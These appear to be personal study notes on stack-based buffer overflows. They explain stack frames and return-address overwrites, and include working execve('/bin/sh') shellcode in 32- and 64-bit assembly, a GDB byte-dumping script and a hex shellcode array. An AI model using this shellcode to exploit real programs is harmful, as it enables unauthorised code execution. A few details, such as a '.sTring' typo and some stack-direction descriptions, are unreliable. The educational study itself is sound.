# Introduction 

### Buffer :   
A buffer is simply a contiguous block of computer memory that holds multiple instances of the same data type.
(Commonly it s associated with characters array)

#### Overflow :
 To overflow is to flow, or fill over the top, brims, or bounds. We will concern ourselves only with the overflow of dynamic buffers, otherwise known as stack­based buffer overflows.

# Process Memory Organization 

Processes are divided into three regions: Text, Data, and Stack :
- The text region is fixed by the program and includes code (instructions) and read­only data (the text section of the executable file) .
- The data region contains initialized and uninitialized data.  (the data­bss sections of the executable file)

![[Pasted image 20251121110919.png]]

# Stack
A stack is an abstract data type : LIFO / PUSH / POP
The stack is used to organize the workflow of a program and to dynamically allocate the local variables used in functions, to pass parameters to the functions  and to return values from the function.

# Stack Region 
- Contiguous block of memory containing data
- SP : stack pointer (reg pointing to the top of the stack , high address)
- BP : base pointer (bottom of the stack that is a fixed address )
- Stack's size is dynamically adjusted by the kernel at run time
- push and pull are asm instructions (operands) implemented by the CPU
- Call function -> Pushing a stack frame 
- Returning a function -> Popping a stack frame

# Stack frame : 
A stack frame contains the parameters to a function, its local variables, and the data necessary to recover the previous stack frame, including the value of the instruction pointer at the time of the function call.
- FP / LB : frame / local base pointer points to the top of the stack.
- Local vars are referenced by offsets from SP, but it s hard to keep track of those offsets (SP value is variable by push and pop instructions)
- So many compilers use a second register, FP, for referencing both local variables and parameters because their distances from FP do not change with PUSHes and POPs.
- Parameters have pos offsets from BP / local vars have neg offsets from BP
# Procedure prolog :
- Call a procedure/function .
- Push the IP (instruction pointer to the stack / return address).
- Save the current FP . (SFP)
- FP <- SP to create the new FP. 
- Advances SP to reserve space for local variables .  (substract the variables size from SP)
      ![[Pasted image 20251124161327.png]]
- Buffers are only in multiples of word size , so if we need 5 bytes then our buffer will take 8 bytes of memory. (2 words : 2 * 4)
![[Pasted image 20251124161829.png]]

# Procedure epilog :
- Clean the stack 
- SP <- FP
- restore old FP
- return/ exit
# Buffer Overflow : 
 A buffer overflow is the result of stuffing more data into a buffer than it can handle.
 - strcpy() (doesn t check the bounds when copying data ) instead of strncpy() 
 - Segmentation fault occurs when u overflow the buffer with arbitrary data , that overwrites the bottom of the stack (sfp, ret , parameters ), for example if u fill it with a lot of A's , the ret address becomes 0x414141 , the program tries to read the next instruction from that address that is outside of the process address space , Segmentation Violation !!!
 -  Buffer overflow allows us to change the return address of a function, then we can control the flow of execution of the program.

# Shell Code :
- Most cases we'll simply force the program to spawn a shell. 
- If no such  code exists , we'll place the shell code in the buffer we re overflowing , and overwrite ret to return back into the buffer.
Assuming stack starts at 0xFF , and S stands for the shell code :

![[Pasted image 20251124230228.png]]

![[Pasted image 20251124230237.png]]
 - gcc -o shellcode -ggdb -static shellcode.c (To avoid references to dynamic C libraries)
 - Pointers are 1 word long (4 bytes)
 - Linux passes its arguments to the system call on the registers, and uses a software interrupt to jump into kernel mode.
 ![[Pasted image 20251125145147.png]]
 ![[Pasted image 20251125145232.png]]
 ![[Pasted image 20251125145346.png]]

 Shell code creation for 32 bit mode : 
```c
void main() {
    __asm__(
        "jmp getstr\n"
        "shellcode:\n"
        "pop %esi\n"               // esi = address of "/bin/sh"
        "mov %esi, 0x8(%esi)\n"    // argv[0] = "/bin/sh"
        "movb $0x0, 0x7(%esi)\n"   // null-terminate
        "movl $0x0, 0xc(%esi)\n"   // argv[1] = NULL
        "movl $0xb, %eax\n"        // execve syscall
        "movl %esi, %ebx\n"        // filename
        "leal 0x8(%esi), %ecx\n"   // argv
        "leal 0xc(%esi), %edx\n"   // envp
        "int $0x80\n"
        "movl $1, %eax\n"          // exit(0)
        "movl $0, %ebx\n"
        "int $0x80\n"
        "getstr:\n"
        "call shellcode\n"
        ".string \"/bin/sh\"\n"
    );
}
```
- Compiling the code for 32 bits systems
```bash
gcc -m32 -g -ggdb -fno-pie -no-pie shellcodeasm.c -o shellcodeasm 

```
- Shell code /bin/sh for 64 bits systems :
```c
void main() {

    __asm__(

        "jmp getstr\n"
        "shellcode:\n"
        "pop %rsi\n"               // rsi = address of "/bin/sh"
        "mov %rsi, 0x8(%rsi)\n"    // argv[0] = "/bin/sh"
        "movb $0x0, 0x7(%rsi)\n"   // null-terminate the string
        "movq $0x0, 0x10(%rsi)\n"  // argv[1] = NULL (64-bit)
        "movl $0x3b, %eax\n"       // execve syscall number (59)
        "mov %rsi, %rdi\n"         // filename (1st arg)
        "leaq 0x8(%rsi), %rsi\n"   // argv (2nd arg)
        "movq $0x0, %rdx\n"        // envp = NULL (3rd arg)
        "syscall\n"                // 64-bit uses syscall, not int 0x80
        "movl $0x3c, %eax\n"       // exit syscall number (60)
        "xor %rdi, %rdi\n"         // exit code 0
        "syscall\n"
        "getstr:\n"
        "call shellcode\n"
        ".sTring \"/bin/sh\"\n"
    );
}
```
 GDB script to get the shell code :
 ```gdb
 echo \n[ Disassembly of main() ]\n
disassemble main

# Get address of main
set $start = main

# Dump raw bytes around main
echo \n[ Raw bytes near main() ]\n
x/200bx $start

# Function to dump bytes as shellcode
define dumphex
  if $argc != 2
    echo Usage: dumphex <start_addr> <length>\n
  else
    set $p = $arg0
    set $n = $arg1
    while $n > 0
      printf "0x%02x, ", *(unsigned char*)$p
      set $p = $p + 1
      set $n = $n - 1
    end
    echo \n
  end
end

echo \n[ Shellcode bytes starting at main+3 ]\n
dumphex main+3 80

 ```
 - Command to execute the gdb script :
 ```bash
 gdb -q -x dump_shellcode.gdb ./shellcodeasm
 ```
 - Shell hex bytes code for 64 bits : 
 ``` c
 unsigned char code[] =
"\xeb\x30\x5e\x48\x89\x76\x08\xc6\x46\x07\x00\x48\xc7\x46\x10"
"\x00\x00\x00\x00\xb8\x3b\x00\x00\x00\x48\x89\xf7\x48\x8d\x76"
"\x08\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00"
"\x48\x31\xff\x0f\x05\xe8\xcb\xff\xff\xff\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00";
 ```
 ![[Pasted image 20251125145936.png]]
![[Pasted image 20251125151048.png]]
- Problem ! : any null bytes in our shellcode will be considered the end of the string , so we should eliminate it .